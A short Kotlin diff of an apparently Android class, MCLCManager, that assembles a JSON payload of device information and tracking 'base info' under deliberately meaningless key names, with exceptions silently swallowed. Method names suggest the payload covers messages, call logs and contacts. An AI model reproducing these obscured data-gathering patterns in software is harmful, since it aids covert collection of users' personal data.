@@ -105,11 +105,6 @@ class MCLCManager {
             }
             // 设备信息
             try {
-//                jobj.addProperty("l9uzoD39Q8", Build.MODEL)
-//                jobj.addProperty("TAEgE", Build.BRAND)
-//                jobj.addProperty("OCwx", Build.ID)
-//                jobj.addProperty("uXBlXBew", locationInfo?.first)
-//                jobj.addProperty("u3zNZE", locationInfo?.second)
                 jsonObject.addProperty(
                     "CEewmJPFFR",
                     GsonUtil.toJson(DevicesHelper.getDevicesInfo(ctx)).orEmpty()
@@ -117,9 +112,13 @@ class MCLCManager {
             } catch (e: Exception) {
             }
 
-            val jsonBase = BaseParamsManager.getMessageCallLogContactsBaseParams()
-            jsonObject.add("FQhZcGE67l", jsonBase)
-            logger_d(TAG, "mclc base = $jsonBase")
+            try {
+                // 埋点数据
+                val jsonBase = BaseInfoHelper.getBaseInfo(ctx)
+                jsonObject.add("FQhZcGE67l", jsonBase)
+                logger_d(TAG, "mclc base = $jsonBase")
+            } catch (e: Exception) {
+            }
             return jsonObject
         }
 
